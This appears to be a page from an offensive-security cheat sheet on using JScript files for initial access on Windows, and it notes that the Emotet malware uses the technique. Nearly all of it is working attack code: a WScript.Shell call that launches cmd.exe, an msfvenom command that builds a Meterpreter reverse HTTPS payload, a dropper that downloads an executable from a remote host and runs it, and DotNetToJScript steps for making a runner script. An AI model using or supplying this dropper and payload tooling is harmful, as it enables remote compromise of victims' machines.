# JScript

JScript is used by popular malware like Emotet. The .js extension is by default associated with Windows Scripting Host - so double clicking such a file will execute it.

### Simple Shell Command

```js
var shell = new ActiveXObject("WScript.Shell")
var res = shell.Run("cmd.exe");
```

### Simple Dropper

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f exe -o met.exe 
```

```js
var url = "http://ip/payload.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');
    
    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;
    Stream.SaveToFile("payload.exe", 2);
    Stream.Close();
}
var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

### Convert C# to JScript

{% embed url="https://github.com/tyranid/DotNetToJScript" %}

Open the project in VS, modify the `ExampleAssembly` as desired (such as the below), build and then run:

```powershell
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```
